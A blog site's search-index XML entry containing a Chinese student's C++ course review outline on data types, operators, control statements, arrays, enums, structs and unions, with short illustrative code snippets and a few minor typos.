<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>C++程序语言设计复习提纲</title>
    <url>/archives/7ad645cf.html</url>
    <content><![CDATA[<p>​ 缓考个人复习用，详细部分在个人未细化的知识点。</p>
<p>​ 大部分资料来源于《C++程序设计》刘瑞芳主编。</p>
<p>​ 集中在数据类型：</p>
<ul>
<li>数组
<ul>
<li>普通数组</li>
<li>多维数组</li>
<li>字符数组</li>
</ul></li>
<li>枚举(enum)、结构(struct)类型、联合类型(union)</li>
<li>类和对象（重点）</li>
</ul>
<p>​ 函数：</p>
<ul>
<li>函数调用</li>
<li>参数传递（值传和地址传）</li>
<li>变量类型(四类)</li>
<li>内联(inline)和重载(overload)</li>
</ul>
<p>​ 指针（重点）：</p>
<ul>
<li><p>指针的基本使用</p></li>
<li><p>动态内存</p></li>
<li><p>引用(类型名 &amp;变量名)</p></li>
<li><p>指针与函数</p>
<ul>
<li>指针与字符串</li>
<li>指针/引用作为参数</li>
</ul></li>
<li><p>指针与数组/结构体</p></li>
<li><p>const的一点知识</p></li>
</ul>
<p>课后习题答案：<a
href="https://blog.csdn.net/Slatter/article/details/93309541">https://blog.csdn.net/Slatter/article/details/93309541</a>
<span id="more"></span> # 第一章：C++语言概述</p>
<h2 id="程序设计">程序设计</h2>
<p>​
面向过程的程序设计又称为结构化程序设计，一般强调的是3种基本结构：<strong>顺序、选择和循环结构。</strong></p>
<p>​ 类和对象：<strong>封装性、继承性、多态性</strong></p>
<p>​ 对象是类的实例化，类是对象的抽象。</p>
<p>​
在面向过程的程序设计中，C++的程序模块是以<strong>函数的形式</strong>实现的，在面向对象的程序设计中，C++程序模块是以<strong>类的形式</strong>实现的。</p>
<h2 id="程序开发过程">程序开发过程</h2>
<p>​ 1.源程序</p>
<p>​ 2.目标程序 .obj</p>
<p>​ 源程序经过翻译加工后所生成的程序，一般用机器语言表示</p>
<p>​ 3.可执行程序.exe</p>
<p>​ 目标程序和所用的其他资源进行链接生成的可以直接运行的程序</p>
<p>​ 翻译程序(3类)：</p>
<p>​ -汇编程序：源程序翻译为机器语言形式的目标程序</p>
<p>​ -编译程序：将高级语言编写的源程序翻译成机器语言形式的目标程序</p>
<p>​ -解释程序：将使用高级语言编写的源程序翻译成机器指令</p>
<p>​ 5.链接程序：</p>
<p>​
对汇编程序或编译程序生成的目标程序与所需的其他资源进行链接生成可执行文件的程序。</p>
<p>​ 注释：//注释一行说明，/* */，注释一段说明</p>
<p>​ 编译预处理：“#”开头的代码</p>
<h2 id="内存模型">内存模型</h2>
<p>​
一个程序执行时一定会先<strong>复制到内存</strong>，然后由CPU逐句读取来执行。</p>
<p>​ 每个储存单元有1<strong>个字节的大小(8
bit)</strong>，每个内存单元有一个唯一的地址。一般来说，地址是顺序编址。</p>
<p>​ CPU访问内存，进行取/存，读/写内存中的信息</p>
<p>内存分区使用：</p>
<p>​ <strong>代码区</strong>：被编译成机器码的程序在执行时会被复制此</p>
<p>​ <strong>数据区</strong>：程序中的变量和常量会被存储到此</p>
<p>​ 数据区又分为：</p>
<p>​
<strong>栈区</strong>：存放程序函数的局部变量。先入后出，自动释放</p>
<p>​ 全局变量区和静态变量区： 存放长期数据</p>
<p>​ 常量区一般是存放<strong>字符串常量</strong>的地方</p>
<p>​
<strong>堆区</strong>：在程序设计过程中申请的内存空间，这些空间应该在内存中释放。</p>
<p>​
全局变量和静态变量位于同一个区域，<strong>先定义的放在低地址，后定义的放在高地址</strong>。局部变量则相反，先定义的放在高地址，后定义的放在低地址。</p>
<p>​ C++程序由<strong>注释、编译预处理、程序主体</strong>组成。</p>
<p>​
一个C++程序需要经过<strong>编辑、编译和链接</strong>，才能产生可执行文件。</p>
<h1 id="第二章基本数据类型与表达式">第二章：基本数据类型与表达式</h1>
<h2 id="词法记号和标识符">词法记号和标识符</h2>
<p>关键词：</p>
<p>auto bool break case catch char class const</p>
<p>const_cast continue default delete do double dynamic_cast else</p>
<p>enum explicit extern false float for friend goto</p>
<p>if inline int long mutable namespace new operator</p>
<p>private protected public register reinterpret_case return short
signed</p>
<p>sizeof static static_cast struct switch template this throw</p>
<p>true try typedef typeid typename union unsigned using</p>
<p>virtual void volatile while</p>
<p>标识符：C++的标识符是<strong>大小写敏感</strong>的</p>
<h2 id="数据类型">数据类型</h2>
<p>基础数据类型：整型、字符型、实型、逻辑型</p>
<p>自定义数据类型：数组、指针、引用、空类型、结构、联合、枚举、类</p>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">分类</th>
<th style="text-align: center;">名称</th>
<th style="text-align: center;">标识</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;"></td>
<td style="text-align: center;">整型</td>
<td style="text-align: center;">int</td>
</tr>
<tr class="even">
<td style="text-align: center;"></td>
<td style="text-align: center;">字符型</td>
<td style="text-align: center;">char</td>
</tr>
<tr class="odd">
<td style="text-align: center;">基础数据类型</td>
<td style="text-align: center;">实型</td>
<td style="text-align: center;">float、double</td>
</tr>
<tr class="even">
<td style="text-align: center;"></td>
<td style="text-align: center;">逻辑型</td>
<td style="text-align: center;">bool</td>
</tr>
<tr class="odd">
<td style="text-align: center;"></td>
<td style="text-align: center;">数组</td>
<td style="text-align: center;">type[]</td>
</tr>
<tr class="even">
<td style="text-align: center;"></td>
<td style="text-align: center;">指针</td>
<td style="text-align: center;">type*</td>
</tr>
<tr class="odd">
<td style="text-align: center;">自定义数据类型</td>
<td style="text-align: center;">引用</td>
<td style="text-align: center;">type&amp;</td>
</tr>
<tr class="even">
<td style="text-align: center;"></td>
<td style="text-align: center;">空类型</td>
<td style="text-align: center;">void</td>
</tr>
<tr class="odd">
<td style="text-align: center;"></td>
<td style="text-align: center;">结构</td>
<td style="text-align: center;">struct</td>
</tr>
<tr class="even">
<td style="text-align: center;"></td>
<td style="text-align: center;">联合</td>
<td style="text-align: center;">union</td>
</tr>
<tr class="odd">
<td style="text-align: center;"></td>
<td style="text-align: center;">枚举</td>
<td style="text-align: center;">enum</td>
</tr>
<tr class="even">
<td style="text-align: center;"></td>
<td style="text-align: center;">类</td>
<td style="text-align: center;">class</td>
</tr>
</tbody>
</table>
<p>修饰基本数据类型的关键词：</p>
<p>short 短整型 2字节(16 bit)</p>
<p>long 修饰int和double</p>
<p>unsigned 修饰char、short和int，表示该数据类型为无符号数</p>
<p>signed 与上面相反</p>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">类型</th>
<th style="text-align: center;">长度（字节）</th>
<th style="text-align: center;">取值范围</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">char/signed char</td>
<td style="text-align: center;">1</td>
<td style="text-align: center;">-128~127</td>
</tr>
<tr class="even">
<td style="text-align: center;">unsigned char</td>
<td style="text-align: center;">1</td>
<td style="text-align: center;">0~255</td>
</tr>
<tr class="odd">
<td style="text-align: center;">short int/short</td>
<td style="text-align: center;">2</td>
<td style="text-align: center;">-32768~32767</td>
</tr>
<tr class="even">
<td style="text-align: center;">unsigned short int</td>
<td style="text-align: center;">2</td>
<td style="text-align: center;">0~65535</td>
</tr>
<tr class="odd">
<td style="text-align: center;">int/signed int</td>
<td style="text-align: center;">4</td>
<td style="text-align: center;">-2<sup>31</sup>~2<sup>31</sup>-1</td>
</tr>
<tr class="even">
<td style="text-align: center;">unsigned int</td>
<td style="text-align: center;">4</td>
<td style="text-align: center;">0~2<sup>32</sup>-1</td>
</tr>
<tr class="odd">
<td style="text-align: center;">long/long int</td>
<td style="text-align: center;">4</td>
<td style="text-align: center;">-2<sup>31</sup>-2<sup>31</sup>-1</td>
</tr>
<tr class="even">
<td style="text-align: center;">unsigned long</td>
<td style="text-align: center;">4</td>
<td style="text-align: center;">0~2<sup>32</sup>-1</td>
</tr>
<tr class="odd">
<td style="text-align: center;">float</td>
<td style="text-align: center;">4</td>
<td
style="text-align: center;">-3.4x10<sup>38</sup>~3.4x10<sup>34</sup></td>
</tr>
<tr class="even">
<td style="text-align: center;">double</td>
<td style="text-align: center;">8</td>
<td
style="text-align: center;">-1.7x10<sup>308</sup>~1.7x10<sup>308</sup></td>
</tr>
<tr class="odd">
<td style="text-align: center;">long double</td>
<td style="text-align: center;">8</td>
<td
style="text-align: center;">-1.7x10<sup>308</sup>~1.7x10<sup>308</sup></td>
</tr>
</tbody>
</table>
<p>16位机下int的长度为2字节；32位机下int的长度为4字节</p>
<p>short和long表示的长度是固定的，因此如果需要编写可移植性好的程序，应将整型数据声明为short</p>
<h2 id="变量和常量">变量和常量</h2>
<h3 id="变量">变量</h3>
<p>​
变量的实质是内存中的一个<strong>地址空间</strong>，在这个地址空间中可以进行数据的存储和读取。</p>
<p>​ 变量定义语句是为变量分配存储空间</p>
<p>​ 先定义或声明，后使用，且只能定义一次</p>
<p>typedef：声明原有数据类型的一个<strong>别名</strong></p>
<h3 id="常量">常量</h3>
<p>​ 使用const定义常量</p>
<h4 id="符号常量">符号常量：</h4>
<p>​ const 数据类型 常量名 = 常量值，必须在定义时就进行初始化</p>
<h4 id="整型常量">整型常量：</h4>
<p>​ 八进制：以数字0开头</p>
<p>​ 十六进制：以0x或0X开头</p>
<p>​
整型常数默认是int类型，后缀字母L或l表示长整型，后缀字母U或u表示无符号型</p>
<h4 id="实型常量">实型常量：</h4>
<p>​
指数：<strong>aEb</strong>的形式表示，代表<strong>ax10<sup>b</sup></strong>。b必须是十进制数</p>
<p>​
实型常数默认为double型，可以用后缀字母f或F转换为float型，后缀L或l表示long
double型</p>
<h4 id="字符常量">字符常量：</h4>
<p>​ 用单括号括起来的一个可显示字符表示字符常数，如'a'、'A'等</p>
<p>​ 转义字符：以“”开头，回车，o是八进制数，h是十六进制数</p>
<p>​
在内存中，字符数据以ASCII码存储，也可以看成是单字节整数表示，所以字符数据和整型数据之间可以相互转换。</p>
<h4 id="字符串常量">字符串常量：</h4>
<p>​ 由双引号括起来的字符序列，例如"abc","Hello
World"，除了存储包含的字符，还需要存储一个结束符'\0'</p>
<h4 id="逻辑常量">逻辑常量：</h4>
<p>​ 0和1</p>
<h2 id="运算符和表达式">运算符和表达式</h2>
<p>​
表达式由<strong>运算符</strong>、<strong>操作数</strong>(常量、变量)和<strong>分隔符号</strong>组成的序列，并总能返回一个<strong>值</strong>作为表达式的结果</p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230207003559609.png" /></p>
<p>​ 三元运算符：? :</p>
<p>​ 取余运算：%</p>
<p>​ 只要有一个操作数是浮点数，除法的结果就是浮点数。</p>
<p>​ 不允许对浮点数进行取余操作</p>
<p>​ 前置++i：先+1，后使用</p>
<p>​ 后置i++：先使用，后+1</p>
<p>​ 关系表达式的结果类型为bool</p>
<p>​ 除了逻辑非，逻辑运算的级别低于关系运算</p>
<p>​
&amp;&amp;和||为短路运算符，只要能确定逻辑表达式的结果，就不再进行运算</p>
<h4 id="位运算">位运算：</h4>
<p>​
按位与(&amp;)、按位或(|)、按位异或(^)、按位取反(~)、左移位(&lt;&lt;)、右移位(&gt;&gt;)</p>
<p>​ 按位与：将两个操作数对应的每一位分别进行逻辑与操作</p>
<p>​
使用逻辑与可以将操作数中的若干位置0（其他位不变），或者去操作数中的若干位</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">a=a&amp;<span class="number">0376</span><span class="comment">//将字符变量a的最低位置0</span></span><br><span class="line"><span class="type">char</span> c=a&amp;<span class="number">0377</span> <span class="comment">//取整型变量a的低字节</span></span><br></pre></td></tr></table></figure>
<p>​ 按位或：</p>
<p>​ 将操作数中的若干位置1（其他位不变）</p>
<p>​ 按位取反：~1=0,~0-=1</p>
<p>​
位运算的常见用法是实现掩码运算，掩码是一个位模式，从一个字中选出一组位。</p>
<p>​
例如：0xFF表示一个字的低位字节，若有int型变量x，则位运算x&amp;0xFF生成一个由x的最低字节组成的值，而其他字节置0，这就相当于从x中选出它的最低字节。</p>
<p>​ 条件运算符：表达式1?表达式2:表达式3；</p>
<p>​ 如果表达式1的值为真，则返回表达式2，否则返回表达式3</p>
<h4 id="数据类型转换">数据类型转换</h4>
<p>​
转换的基本原则是将精度较低、范围较小的类型转换为精度较高、范围较大的类型。</p>
<p>​ 逻辑运算，非0即真</p>
<p>​ 强制类型转换：(数据类型名)表达式 或 数据类型名(表达式)</p>
<p>​ 强制类型转换运算符：static_cast<类型名>(表达式)</p>
<h3 id="输入输出">输入输出</h3>
<h4 id="基本输出">基本输出</h4>
<p>​ putchar 输出字符 putchar()</p>
<p>​ printf</p>
<h4 id="基本输入">基本输入</h4>
<p>​ getchar getchar()</p>
<p>​ scanf scanf("%",&amp;)</p>
<table>
<colgroup>
<col style="width: 11%" />
<col style="width: 88%" />
</colgroup>
<thead>
<tr class="header">
<th style="text-align: center;">类型字符</th>
<th style="text-align: center;">含义</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">d</td>
<td style="text-align: center;">十进制数</td>
</tr>
<tr class="even">
<td style="text-align: center;">o</td>
<td style="text-align: center;">八进制数</td>
</tr>
<tr class="odd">
<td style="text-align: center;">x</td>
<td style="text-align: center;">十六进制数</td>
</tr>
<tr class="even">
<td style="text-align: center;">u</td>
<td style="text-align: center;">无符号十进制数</td>
</tr>
<tr class="odd">
<td style="text-align: center;">i</td>
<td style="text-align: center;">整型</td>
</tr>
<tr class="even">
<td style="text-align: center;">f</td>
<td style="text-align: center;">实型的小数形式</td>
</tr>
<tr class="odd">
<td style="text-align: center;">e</td>
<td style="text-align: center;">实型的指数形式</td>
</tr>
<tr class="even">
<td style="text-align: center;">g</td>
<td style="text-align: center;">f和e的较短形式</td>
</tr>
<tr class="odd">
<td style="text-align: center;">c</td>
<td style="text-align: center;">字符</td>
</tr>
<tr class="even">
<td style="text-align: center;">s</td>
<td style="text-align: center;">字符串</td>
</tr>
<tr class="odd">
<td style="text-align: center;">l或h</td>
<td
style="text-align: center;">放在任何整数转换说明符之前，用于输入/输出long或short类型数据</td>
</tr>
<tr class="even">
<td style="text-align: center;">l或L</td>
<td
style="text-align: center;">放在任何浮点转换说明符之前，用于输入/输出double或long
double类型数据</td>
</tr>
</tbody>
</table>
<h4 id="标准输入输出流">标准输入输出流</h4>
<p>​ cin</p>
<p>​ 使用提取操作符“&gt;&gt;”将键盘键入的数据读入到变量中</p>
<p>​ cout</p>
<p>​ 使用插入操作符“&lt;&lt;”</p>
<h3 id="sizeof运算符">sizeof运算符</h3>
<p>​ 用于确定某种数据的长度，单位是字节</p>
<h3 id="输出格式控制">输出格式控制</h3>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%4d,OK\n&quot;</span>,<span class="number">3</span>);<span class="comment">//控制宽度为4</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%04d,OK\n&quot;</span>,<span class="number">3</span>);<span class="comment">//位数不足4位前面填0</span></span><br></pre></td></tr></table></figure>
<p>​ C++的I/O流提供了操纵符</p>
<p>​ 1.设置域宽 <strong>setw(int n)</strong>控制输出间隔</p>
<p>​ 2.左对齐：<strong>setiosflags(ios::left)</strong>
右对齐：<strong>setiosflags(ios::right)</strong></p>
<p>​
除了<strong>setw()</strong>操纵符外，其他操纵符一旦设置，则对后面所有的输入/输出造成影响，直到重新设置才改变格式；</p>
<p>​ 3.设置填充字符</p>
<p>​ <strong>setfill(char c)</strong>来设置其他字符作为间隔的填充</p>
<p>​ 4.设置浮点数的显示</p>
<p>​ C++默认输出的浮点数有效位为6位，但单独使用<strong>setprecision(int
n)</strong>可以控制显示浮点数的数字个数</p>
<p>​ 直接输出或设置精度为0都是输出6位有效数字</p>
<p>​
<strong>setiosflags(ios::fixed)</strong>操纵符是用定点方式表示浮点数，若不设置精度，则显示六位有效小数，总的有效数字可以超过6位</p>
<p>​
<strong>setiosflags(ios::scientific)</strong>操纵符使用质数方法显示浮点数</p>
<p>​ 将<strong>setprecision(int
n)</strong>和<strong>setiosflags(ios::scientific)</strong>控制指数表示法的小数位数</p>
<p>​ 使用操纵符将小数截短显示后，将进行四舍五入处理</p>
<h3 id="string">string</h3>
<p>​
关系运算符实际上比较的是两个string对象的字母，即字符ASCII码的大小</p>
<h3 id="文件读写">文件读写</h3>
<p>​ 使用标准库的ifstream类和ofstream类来定义文件流对象</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">ofstream <span class="title">ofile</span><span class="params">(<span class="string">&quot;odata.txt&quot;</span>)</span></span>;<span class="comment">//定义文件流对象ofile，并指定它与磁盘文件odata.txt关联</span></span><br><span class="line">ofile&lt;&lt;i&lt;&lt;endl;<span class="comment">//将变量i的值写入文件</span></span><br><span class="line">ofile.close</span><br></pre></td></tr></table></figure>
<h1 id="第三章控制语句">第三章：控制语句</h1>
<h2 id="基本控制结构">基本控制结构</h2>
<p>​
3种基本控制结构：<strong>顺序结构</strong>、<strong>选择结构</strong>和<strong>循环结构</strong></p>
<p>​ 顺序结构：按语句编写顺序执行的语句结构</p>
<p>​ 选择结构：根据给定条件的真假而选择不同语句执行的语句结构</p>
<p>​
循环结构：在一定条件下重复执行指定语句的语句组，用于处理需要重复执行某些操作的问题</p>
<h3 id="算法及其表示">算法及其表示</h3>
<p>​
算法：解决特定问题的方法和具体步骤。可以先用伪代码或流程图来表述算法，然后再逐渐完善</p>
<p>​ <img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230207165455521.png" /></p>
<h4 id="switch">switch</h4>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span>(表达式)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">case</span> 常量表达式<span class="number">1</span>:</span><br><span class="line">        语句<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> 常量表达式<span class="number">1</span>:</span><br><span class="line">        语句<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">case</span> 常量表达式n:</span><br><span class="line">        语句n;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        语句n+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​
表达式的值可以是字符型、整型，也可以是枚举型，其他类型不允许（实型、指针类型等）</p>
<h3 id="循环结构">循环结构</h3>
<p>​
循环语句的主要部分是：<strong>循环控制条件</strong>、<strong>循环体</strong>和<strong>循环控制变量</strong></p>
<p>​ while()：表达式为真则执行，先判断后执行</p>
<p>​ do-while：先执行一次，再判断表达式的值</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">	循环体语句;</span><br><span class="line">&#125;<span class="keyword">while</span>(表达式);</span><br></pre></td></tr></table></figure>
<p>​ for：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(循环控制变量赋初值;循环条件;修改循环控制变量值)</span><br><span class="line">&#123;</span><br><span class="line">	循环体语句;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​
一般用for实现循环次数一定的问题，而用while和do-while实现循环次数事先不能确定的问题。</p>
<ul>
<li><p>for语句的3个表达式种任意一个或几个可以不写，但是“；”不能省略</p></li>
<li><p>省略表达式1意味着循环控制变量赋初值的语句要放在for语句之前完成。</p></li>
<li><p>表达式1和表达式3都可以是逗号语句</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(sum=<span class="number">0</span>,k=<span class="number">1</span>;k&lt;=<span class="number">10</span>;k++)</span><br><span class="line">&#123;</span><br><span class="line">	sum+=k*k;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>​ break:从循环体跳出，去执行循环结构后面的语句</p>
<p>​ continue:提前结束本次循环，进入下次循环</p>
<h2 id="随机数">随机数</h2>
<p>​ rand()可以产生一个0~RAND_MAX之间的随机数，是伪随机数</p>
<p>​ 需要在使用rand()用srand()函数为随机数序列设置种子</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctime&gt;</span></span></span><br><span class="line"><span class="built_in">srand</span>((<span class="type">unsigned</span>)<span class="built_in">time</span>(<span class="literal">NULL</span>));</span><br></pre></td></tr></table></figure>
<h2 id="结构嵌套">结构嵌套</h2>
<p>​ if嵌套：从最内层开始，else总是与前面最近的（未曾匹配的）if配对</p>
<h1 id="第四章数组及自定义数据类型">第四章：数组及自定义数据类型</h1>
<p>​
用户自定义的数据类型和系统预定义的数据类型的地位<strong>是等价的</strong></p>
<p>​
数组的分量称为<strong>元素</strong>，结构的分量为<strong>成员</strong>；</p>
<p>​
数组<strong>存储类型和意义相同</strong>的<strong>集合元素</strong>，结构类型的成员用不同的数据类型描述了<strong>一种实体的不同属性</strong>。</p>
<p>​ 枚举类型实质是<strong>有限个整数</strong>的集合。</p>
<p>​
结构变量所占内存长度是各个成员所占的<strong>内存长度之和</strong>，每个成员都有自己的内存单元。</p>
<p>​
联合变量所占的内存长度等于<strong>最长的成员的长度</strong>，无论有多少成员，他们共用内存单元。</p>
<h2 id="数组array">数组（Array）</h2>
<h3 id="定义数组">定义数组：</h3>
<p>​ 类型标识符 数组名[<strong>常量</strong>表达式]；</p>
<p>​
定义语句使系统给该数组分配一段<strong>连续</strong>的内存空间，<strong>数组名表示该内存空间的起始地址</strong></p>
<p>​
元素的下标可以理解为元素存放位置相对于数组名的<strong>偏移量</strong></p>
<p>​ 数组名是一个<strong>地址常量</strong>，禁止给数组名赋值</p>
<p>​ 数组所占字节数：<strong>sizeof</strong>(数组名)或<strong>N *
sizeof</strong>(数组类型)</p>
<h3 id="数组初始化">数组初始化：</h3>
<p>​ 类型标识符
数组名[<strong>常量</strong>表达式]={以逗号隔开的初始化值}；</p>
<p>​ 初始化数值不能多于数组元素，可以少于数组元素</p>
<h3 id="访问数组元素">访问数组元素</h3>
<p>​ 数组元素的下标表达式的结果必须是0或正整数</p>
<p>​ 数组的下标值不得越界</p>
<p>​ 复制两个数组可以使用<strong>memcpy</strong>函数：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a[<span class="number">5</span>],b[<span class="number">5</span>];</span><br><span class="line"><span class="built_in">memcpy</span>(a,b,<span class="built_in">sizeof</span>(b))</span><br></pre></td></tr></table></figure>
<h3 id="字符数组">字符数组</h3>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> chArray[]=<span class="string">&quot;Hello World!&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>​
字符串中每个字符占用1个字节，加上字符串常量最后的结束符，数组需要的字节数比显示的字符数要<strong>多一个</strong>。</p>
<h4 id="初始化字符数组">初始化字符数组</h4>
<ol type="1">
<li><p>用双引号内的字符串常量初始化字符数组</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> array[]=&#123;<span class="string">&quot;Hellow&quot;</span>&#125;;</span><br></pre></td></tr></table></figure></li>
<li><p>用字符常量来初始化字符数组</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> array[]=&#123;<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,\<span class="number">0</span>&#125;;</span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="字符数组的赋值">字符数组的赋值</h4>
<p>​
使用<strong>strcpy</strong>(字符数组1，字符串2)，即字符串复制函数，将字符串2复制到字符数组1</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> str1[<span class="number">10</span>]=<span class="string">&quot;&quot;</span>,str2[]=<span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="built_in">strcpy</span>(str1,str2);</span><br></pre></td></tr></table></figure>
<p>​ 字符数组1要能够容纳被复制的字符串</p>
<p>​
不能用赋值语句将一个字符串常量或字符数组直接给字符数组赋值，如str1="Hello";</p>
<h3 id="多维数组">多维数组</h3>
<p>​ n维数组：<strong>类型标识符
数组名称标识符[常量表达式1][常量表达式2]...[常量表达式n]</strong></p>
<p>​ 多维数组初始化时需要使用嵌套的括号</p>
<h2 id="枚举类型enum">枚举类型(enum)</h2>
<h3 id="枚举类型定义">枚举类型定义</h3>
<p>​ <strong>enum 新的数据类型名称{变量值名称}</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">weekday</span>&#123;sun,mon,tue,wed,thu,fri,sat&#125;;</span><br></pre></td></tr></table></figure>
<p>​ sun，mon等称为枚举元素或枚举常量</p>
<h3 id="枚举变量定义及使用">枚举变量定义及使用</h3>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">weekday</span>&#123;sun,mon,tue,wed,thu,fri,sat&#125;;</span><br><span class="line">weekday day;</span><br></pre></td></tr></table></figure>
<p>​ 变量day的取值范围为类型定义</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">day=sat;</span><br></pre></td></tr></table></figure>
<ol type="1">
<li><p>在类型定义后，枚举元素<strong>按常量处理</strong>，不能对它们赋值，如：sum=0</p></li>
<li><p>枚举元素具有默认值，它们依次为：0，1，...。例如，sun=0，mon=1，...</p></li>
<li><p>枚举类型可以进行关系运算，但不能进行其他运算</p></li>
<li><p>也可以在类型声明时另行指定枚举元素的值</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">weekday</span>&#123;sun=<span class="number">7</span>,mon=<span class="number">1</span>,tue,wed,thu,fri,sat&#125;;</span><br></pre></td></tr></table></figure></li>
<li><p>枚举值可以直接赋给整型变量，但整数值不能直接赋给枚举变量；若需要将整数值赋给枚举变量，则需要进行强制类型转换，如day=weekday(3)</p></li>
</ol>
<h2 id="结构类型struct">结构类型(struct)</h2>
<h3 id="结构类型的定义和初始化">结构类型的定义和初始化</h3>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> 结构类型名</span><br><span class="line">&#123;</span><br><span class="line">    数据类型说明符<span class="number">1</span> 成员名<span class="number">1</span>;</span><br><span class="line">    数据类型说明符<span class="number">2</span> 成员名<span class="number">2</span>;</span><br><span class="line">    ...</span><br><span class="line">    数据类型说明符n 成员名n;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>​ 例如：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">student</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">long</span> num;</span><br><span class="line">    <span class="type">char</span> namep[<span class="number">20</span>];</span><br><span class="line">    <span class="type">char</span> sex;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    <span class="type">float</span> score;</span><br><span class="line">    <span class="type">char</span> addr[<span class="number">30</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​ 大括号括起的内容称为结构的<strong>成员</strong>。</p>
<h3 id="结构变量的定义和使用">结构变量的定义和使用</h3>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">studnet s1;</span><br></pre></td></tr></table></figure>
<p>​
要访问结构的成员，需要使用圆点操作符”.“，它是双目操作符，左边的操作数是结构变量名，右边的操作数是结构的成员名，引用形式为：<strong>结构变量名.成员名</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">cout&lt;&lt;s1.name;</span><br></pre></td></tr></table></figure>
<h3 id="结构变量的初始化">结构变量的初始化</h3>
<ol type="1">
<li><p>在结构变量定义的同时设置初始值</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">student s2=&#123;<span class="number">20041118</span>,”Li Li“，<span class="number">18</span>，<span class="number">90</span>，”Xi Tu Cheng Lu <span class="number">10</span>“&#125;;</span><br></pre></td></tr></table></figure></li>
<li><p>在程序中，单独给结构变量的各个成员赋值</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">s1.num=<span class="number">20041118</span>;</span><br><span class="line"><span class="built_in">strcpy</span>(s1.name,”Li Li“);</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="结构变量的赋值运算">结构变量的赋值运算</h3>
<p>​
属于同一结构类型的各个变量之间可以相互赋值，即使结构体内有数组类型的数据成员。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">student s1,s2;</span><br><span class="line">s1=s2;</span><br></pre></td></tr></table></figure>
<p>​ 不同结构的变量不允许相互赋值，即使这两个变量可能有同样的成员。</p>
<p>​
结构变量代表一个完整的内存空间，复制结构变量就是将这块内存空间整体复制到另一个位置。</p>
<h2 id="联合类型union">联合类型(union)</h2>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> 联合类型名</span><br><span class="line">&#123;</span><br><span class="line">    数据类型说明符<span class="number">1</span> 成员名<span class="number">1</span>;</span><br><span class="line">    数据类型说明符<span class="number">2</span> 成员名<span class="number">2</span>;</span><br><span class="line">    ...</span><br><span class="line">    数据类型说明符n 成员名n;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>​ 联合类型变量定义的语法形式为：<strong>联合类型名
联合变量名</strong></p>
<p>​ 在某时刻，只能使用多个成员的其中之一</p>
<p>​ 引用形式：联合变量名.成员名</p>
